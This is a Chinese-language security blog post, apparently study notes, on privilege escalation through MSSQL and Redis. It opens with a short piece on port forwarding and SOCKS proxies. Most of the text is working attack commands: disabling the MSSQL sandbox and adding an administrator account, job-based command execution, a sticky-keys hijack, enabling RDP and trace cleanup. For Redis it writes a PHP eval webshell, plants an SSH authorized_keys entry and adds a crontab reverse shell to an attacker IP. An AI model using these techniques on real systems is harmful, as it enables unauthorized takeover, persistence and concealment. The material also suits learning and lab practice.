<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113152916704.png"  ><span class="image-caption">image-20230113152916704</span></p>
<p>具有system权限</p>
<p>提权成功</p>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>思路方法大致和xp_cmdshell差不多，就是调用sp_oacreate组件来执行命令</p>
<p>但是没有回显，不方便</p>
<p>还是优先使用xp_cmdshell来实现</p>
<h2 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>沙盒模式是数据库的一种安装机制</p>
<p>开启沙盒模式时，只对控件和字段属性中的安全且不含恶意代码，才能执行</p>
<p>简而言之，就是不能执行恶意代码</p>
<h3 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h3><p>首先得知道，控制沙盒模式的参数    SandBoxMode</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">`0`：在任何所有者中禁止启用安全模式<br>`1`：为仅在允许范围内<br>`2`：必须在access模式下<br>`3`：完全开启<br></code></pre></td></tr></table></figure>

<p>我们需要做的就是关闭沙盒模式，然后执行代码</p>
<p>用xp_regwrite这个存储这个存储过程对注册表进行写操作，关闭沙盒模式</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_regwrite</span> <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SoftWare\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113161625252.png"  ><span class="image-caption">image-20230113161625252</span></p>
<p>如果执行失败，应该是没有<font color='red'>打开允许修改高级参数</font>，打开后应该时可以关闭沙盒模式的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,1;reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,1;reconfigure;<br></code></pre></td></tr></table></figure>



<p>查询是否关闭沙盒模式，但是经过测试发现，无论是否关闭，好像都是不影响我们执行语句的</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">exec master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_regread</span> <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<br><span class="hljs-string">&#x27;SandBoxMode&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113161656995.png"  ><span class="image-caption">image-20230113161656995</span></p>
<p>关闭成功</p>
<p>添加管理员用户</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-symbol">&#x27;microsoft.jet.oledb.4.0</span><span class="hljs-string">&#x27;,&#x27;</span>;database=c:/windows/system32/ias/ias.mdb<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">select</span> shell(<span class="hljs-string">&quot;net user margin margin /add&quot;</span>)&#x27;)<br><br><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-symbol">&#x27;microsoft.jet.oledb.4.0</span><span class="hljs-string">&#x27;,&#x27;</span>;database=c:/windows/system32/ias/ias.mdb<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">select</span> shell(<span class="hljs-string">&quot;net localgroup administrators margin /add&quot;</span>)&#x27;)<br></code></pre></td></tr></table></figure>

<p>然后就成功了</p>
<h3 id="痕迹清理-1"><a href="#痕迹清理-1" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#删除用户</span><br><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net user margin margin /del&quot;)&#x27;</span>)<br><br><span class="hljs-comment">#打开沙盒</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">#关闭高级设置修改</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;<br>reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;<br>reconfigure;<br></code></pre></td></tr></table></figure>



<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>沙盒提权，其实就是，关闭沙盒模式，来执行敏感语句</p>
<h2 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>通过创建应该任务，来执行命令</p>
<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><p>首先开启sqlagent服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.dbo.xp_servicecontrol <span class="hljs-string">&#x27;start&#x27;</span>,<span class="hljs-string">&#x27;SQLSERVERAGENT&#x27;</span>;<br></code></pre></td></tr></table></figure>



<p>然后添加任务</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> msdb<br><br><span class="hljs-keyword">exec</span> sp_delete_job null,<span class="hljs-string">&#x27;x&#x27;</span><br><br><span class="hljs-keyword">exec</span> sp_add_job <span class="hljs-string">&#x27;x&#x27;</span><br></code></pre></td></tr></table></figure>



<p>通过任务来执行命令，将结果保存在    c:/1.txt</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> sp_add_jobstep <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;cmdexec&#x27;</span>,<span class="hljs-string">&#x27;cmd /c &quot;ipconfig&gt;c:/1.txt&quot;&#x27;</span><br><br><span class="hljs-keyword">exec</span> sp_add_jobserver <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;x&#x27;</span>,@<span class="hljs-variable">@servername</span><br><br><span class="hljs-keyword">exec</span> sp_start_job <span class="hljs-string">&#x27;x&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113165411396.png"  ><span class="image-caption">image-20230113165411396</span></p>
<p>任务启动成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113165441060.png"  ><span class="image-caption">image-20230113165441060</span></p>
<p>命令执行成功</p>
<h2 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>通过使用<font color='cornflowerblue'><strong>xp_regwrite</strong></font>存储过程对注册表进行修改，替换成任意值，造成镜像劫持</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>首先需要数据库<font color='red'>对注册表有写权限</font></p>
<p>其次就是xp_regwrite组件启用</p>
<h3 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h3><p>首先就是查看，<font color='red'>xp_regwrite是否开启</font></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;xp_regwrite&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172155099.png"  ><span class="image-caption">image-20230113172155099</span></p>
<p>发现已经开启</p>
<p><font color='red'>开启xp_regwrite</font></p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">1</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure>



<p>然后就可以<font color='red'>劫持注册表</font>来执行命令了，以连按5次粘滞键，弹出cmd框为例子</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">EXEC</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span>=<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-variable">@key</span>=<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;</span>,<span class="hljs-variable">@value_name</span>=<span class="hljs-string">&#x27;Debugger&#x27;</span>,<span class="hljs-variable">@type</span>=<span class="hljs-string">&#x27;REG_SZ&#x27;</span>,<span class="hljs-variable">@value</span>=<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe&#x27;</span><br></code></pre></td></tr></table></figure>



<p>查看是否成功</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">exec</span></span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span>,<span class="hljs-string">&#x27;Debugger&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172319349.png"  ><span class="image-caption">image-20230113172319349</span></p>
<p>对应值正确</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172406442.png"  ><span class="image-caption">image-20230113172406442</span></p>
<p>成功</p>
<p>删除连按5次粘滞键，弹出cmd框</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">xp_regdeletekey</span> <span class="hljs-operator">&#x27;</span><span class="hljs-type">HKEY_LOCAL</span><span class="hljs-type">_MACHINE</span><span class="hljs-operator">&#x27;,</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">SOFTWARE</span>\<span class="hljs-variable">Microsoft</span>\<span class="hljs-variable">Windows</span> <span class="hljs-variable">NT</span>\<span class="hljs-variable">CurrentVersion</span>\<span class="hljs-built_in">Image</span> <span class="hljs-built_in">File</span> <span class="hljs-variable">Execution</span> <span class="hljs-built_in">Options</span>\<span class="hljs-variable">sethc</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><span class="hljs-operator">&#x27;</span><br></code></pre></td></tr></table></figure>



<p>开启3389端口</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">exec master.dbo.xp_regwrit<span class="hljs-string">e&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><br>exec master..xp_cmdshell &quot;REG ADD &#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#x27; /v fDenyTSConnections /t REG_DWORD /d 0&quot;<br><br>#一定要打开xp_cmdshell<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172939766.png"  ><span class="image-caption">image-20230113172939766</span></p>
<p>成功</p>
<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>镜像劫持的本质，其实就是通过xp_regwrite组件来修改注册表，从而开启一些设置</p>
<h2 id="MSSQL提权总结"><a href="#MSSQL提权总结" class="headerlink" title="MSSQL提权总结"></a>MSSQL提权总结</h2><p>提权手段，大多都是通过mssql数据库的组件，基于mssql数据库本身具有的高权限，从而达到高权限执行命令</p>
<p>比较好用的是，<font color='red'><strong>沙盒提权</strong></font>，<font color='red'><strong>JOB提权</strong></font></p>
<p>其他的提权手段，是会被360等劫持的</p>
<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>oracle数据库是比较特殊的数据库</p>
<p>它是和jsp进行搭建，jsp脚本的特性，导致不需要提权，生成后门，就是system权限</p>
<p>它有三种提权模式</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">普通用户模式<br><br>dba用户模式<br><br>注入模式<br></code></pre></td></tr></table></figure>



<h2 id="操作-5"><a href="#操作-5" class="headerlink" title="操作"></a>操作</h2><p>直接使用工具就行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">[oracle提权执行命令工具oracleShell v0.<span class="hljs-number">1</span>]<br><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jas502n/</span>oracleShell<br></code></pre></td></tr></table></figure>







<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>redis数据库，是一个开源的数据库</p>
<p>使用ANSI C语言编写</p>
<p>提供多种语言的API</p>
<h2 id="搭建redis数据库"><a href="#搭建redis数据库" class="headerlink" title="搭建redis数据库"></a>搭建redis数据库</h2><h3 id="安装redis数据库"><a href="#安装redis数据库" class="headerlink" title="安装redis数据库"></a>安装redis数据库</h3><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzf redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure>



<h3 id="设置远程访问"><a href="#设置远程访问" class="headerlink" title="设置远程访问"></a>设置远程访问</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> redis.conf<br><br>bind <span class="hljs-number">127.0.0.1</span>前面加上<span class="hljs-comment">#号 或者设置为 0.0.0.0 支持其他ip地址访问</span><br><br>保护模式：protected-mode改为<span class="hljs-literal">no</span>，否则无法远程连接<br><br>设置后台运行：daemonize <span class="hljs-literal">yes</span><br><br>密码：修改requirepass xxxxx（你的密码）<br></code></pre></td></tr></table></figure>





<h3 id="端口发放"><a href="#端口发放" class="headerlink" title="端口发放"></a>端口发放</h3><p>首先需要去服务器开放6379端口</p>
<p>还需在本地设置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">firewall-cmd <span class="hljs-attribute">--query-port</span>=6379/tcp<br>如果返回结果为<span class="hljs-literal">no</span>，那么证明6379端口确实没有开启。<br><br><br>输入<br>firewall-cmd <span class="hljs-attribute">--add-port</span>=6379/tcp<br>将6379端口开启，返回success<br><br><br>再次查询端口是否开放<br>firewall-cmd <span class="hljs-attribute">--query-port</span>=6379/tcp<br>返回结果为<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure>



<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/src/</span>redis-server  redis.conf<br></code></pre></td></tr></table></figure>





<h3 id="redis数据库基本命令"><a href="#redis数据库基本命令" class="headerlink" title="redis数据库基本命令"></a>redis数据库基本命令</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">连接数据库<br>redis-cli -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">63</span>.<span class="hljs-number">130</span><br><br><br>查看一些具体信息<br><span class="hljs-number">192.168.63.130:6379</span>&gt;info<br><br><br>将变量x设置为text<br><span class="hljs-number">192.168.63.130:6379</span>&gt;set x <span class="hljs-string">&quot;test&quot;</span><br><br><br>查看所有键<br><span class="hljs-number">192.168.63.130:6379</span>&gt;KEYS *<br><br><br>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复<br><span class="hljs-number">192.168.63.130:6379</span>&gt;CONFIG GET dir<br><span class="hljs-number">192.168.63.130:6379</span>&gt;CONFIG GET dbfilename<br><br><br>删除整个数据库<br><span class="hljs-number">192.168.63.130:6379</span>&gt;flushall<br><br><br>启动Redis服务可以执行：<br>service redisd start<br> <br> <br>关闭服务<br>service redisd stop<br> <br> <br>重启服务<br>service redisd restart<br> <br> <br>在控制台进入redis客户端<br>redis-cli<br> <br><br></code></pre></td></tr></table></figure>

<p>尝试远程连接</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114153932963.png"  ><span class="image-caption">image-20230114153932963</span></p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>如果redis数据库配置不当，就会导致未授权访问漏洞</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">redis</span>数据库允许任意<span class="hljs-built_in">ip</span>访问，并且没有进行添加防火墙规则避免其他非信任来源<span class="hljs-built_in">ip</span>访问等相关安全策略<br></code></pre></td></tr></table></figure>

<p>否则就无法连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">没有设置密码认证（默认为空），可以免密码远程登录数据库<br></code></pre></td></tr></table></figure>

<p>如果设置了密码，是可以连接的，但是无法执行命令</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114161310186.png"  ><span class="image-caption">image-20230114161310186</span></p>
<p>这里连接成功，但是执行操作，需要密码认证</p>
<h2 id="写入webshell提权"><a href="#写入webshell提权" class="headerlink" title="写入webshell提权"></a>写入webshell提权</h2><p>首先连接</p>
<p>然后在目录里面创建文件，写入webshell</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html/                #一般网站目录</span><br><span class="language-xml"></span><br><span class="language-xml">config set dbfilename shell.php               #创建shell文件</span><br><span class="language-xml"></span><br><span class="language-xml">set x &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;     #redis写入文件的会自带一些版本信息，\r\n\r\n是换行的意思</span><br><span class="language-xml"></span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114163230964.png"  ><span class="image-caption">image-20230114163230964</span></p>
<p>去服务器查看</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114163300780.png"  ><span class="image-caption">image-20230114163300780</span></p>
<p>创建成功</p>
<p>此时就可以用蚁剑连接了</p>
<h2 id="SSH登录提权"><a href="#SSH登录提权" class="headerlink" title="SSH登录提权"></a>SSH登录提权</h2><h3 id="提权条件-1"><a href="#提权条件-1" class="headerlink" title="提权条件"></a>提权条件</h3><figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery">在主机<span class="hljs-built_in">是root</span>用户的条件下，启动的redis数据库<br></code></pre></td></tr></table></figure>



<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器<br><br>服务端存在<span class="hljs-string">.ssh</span>目录并且有写入的权限<br></code></pre></td></tr></table></figure>





<h3 id="操作-6"><a href="#操作-6" class="headerlink" title="操作"></a>操作</h3><p>本地生成公钥</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114180000255.png"  ><span class="image-caption">image-20230114180000255</span></p>
<p>进入.ssh目录，保存密钥到key.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/.ssh<br><br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure>



<p>将保存的公钥写入数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt | redis-cli -h 靶机ip地址 -x <span class="hljs-built_in">set</span> pub        <span class="hljs-comment">#命名为pub</span><br></code></pre></td></tr></table></figure>



<p>查看是否写入成功</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> pub<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114180847597.png"  ><span class="image-caption">image-20230114180847597</span></p>
<p>设置路径、文件名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir  /root/.ssh<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys <br><br>save<br></code></pre></td></tr></table></figure>



<p>然后就可以ssh远程连接了</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">ssh ip地址<br><br>或者<br><br>ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@ip</span>地址<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114202521056.png"  ><span class="image-caption">image-20230114202521056</span></p>
<p>成功</p>
<p>这最后一步ssh连接我卡了半天</p>
<p>首先我们要知道的是    PermitRootLogin    这个参数</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">PermitRootLogin如果不设置，默认是yes,也就是root可以登录<br><br>如果设置<span class="hljs-keyword">without</span>-<span class="hljs-keyword">password</span> 那么root可以登录，但是不允许通过密码ssh登陆<br>如果设置<span class="hljs-keyword">no</span>, root不许登陆<br>如果设置forced-commands-<span class="hljs-keyword">only</span>，则可以登录，但是登陆后不能进入交互，而是执行指定的命令后 自动退出<br></code></pre></td></tr></table></figure>

<p>这个参数在<font color='red'>阿里云服务器默认是no</font>，在<font color='red'>腾讯云默认yes</font></p>
<p>该参数位置在</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure>



<p>另一个需要注意的点是</p>
<p>我们需要在攻击机的    /root/.ssh    目录下执行命令，否则不会成功</p>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>shh登陆提权的要点是</p>
<p>首先就是需要开启ssh连接，对/root/.ssh目录有写权限</p>
<p>还有就是数据库没有设置密码，否则我们是写不进去的</p>
<p>还有就是个人觉得比较重要的就是，在主机是root用户的条件下，启动的redis数据库（电脑用户是root，并不是说redis数据库是root用户）</p>
<p>我们最终获得的权限，就是打开数据库那个用户的权限，如果权限比较低，用这种方法提权，就没有必要</p>
<h2 id="crontab计划任务提权"><a href="#crontab计划任务提权" class="headerlink" title="crontab计划任务提权"></a>crontab计划任务提权</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p>
<h3 id="操作-7"><a href="#操作-7" class="headerlink" title="操作"></a>操作</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">redis-cli -h 192.168.244.128 -p 6379<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.232.129/1111 0&gt;&amp;1\n\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron/crontabs/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>

<p>然后开启nc监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -nlvp <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>

<p>最后过一会就能收到监听</p>
<p>我是用ubuntu测试的，无法成功，只能用centos</p>
<p>原因</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">因为默认redis写文件后是<span class="hljs-number">644</span>的权限，但ubuntu要求执行定时任务文件<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<span class="hljs-regexp">/权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/</span>var<span class="hljs-regexp">/spool/</span>cron/权限<span class="hljs-number">644</span>也能执行<br><br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错<br><br>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>Ubuntu定时任务文件在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/<br></code></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>权限提升</tag>
      </tags>
  </entry>
  <entry>
    <title>端口转发与内网代理</title>
    <url>/2023/03/02/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><p>在拿到一个外网主机的权限之后，是无法访问内网资源的</p>
<p>此时就可以使用端口转发和代理技术，来进行访问内网资源</p>
<h2 id="正、反向连接"><a href="#正、反向连接" class="headerlink" title="正、反向连接"></a>正、反向连接</h2><p>正向连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">用跳板机主动去连接目标主机<br></code></pre></td></tr></table></figure>



<p>反向连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">让目标机来连接跳板机器<br></code></pre></td></tr></table></figure>



<p>内网中多数用到的是反向连接</p>
<p>正向连接容易被目标机器的防火墙拦截，反向连接就不用考虑这种情况</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p><font color='red'>端口转发</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">把一个端口上收到的数据，转发给另外一个端口<br></code></pre></td></tr></table></figure>



<p>内网中的防火墙和入侵检测设备，会对一些敏感端口进行检测，发现异样就会强制断开通信</p>
<p>利用端口转发技术，可以把端口的资源转发到未被检测的端口</p>
<p><font color='cornflowerblue'>端口映射</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">将外网主机收到的请求映射到内网主机上，使内网主机可以对外提供服务<br></code></pre></td></tr></table></figure>





<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>socks是一种代理协议</p>
<p>在1080端口</p>
<p>有socks4和socks5两个版本</p>
<p>socks4</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">只支持TCP<br></code></pre></td></tr></table></figure>

<p>socks5</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">socks4协议的升级版本，支持TCP和UDP，还有各种身份验证机制的协议<br></code></pre></td></tr></table></figure>







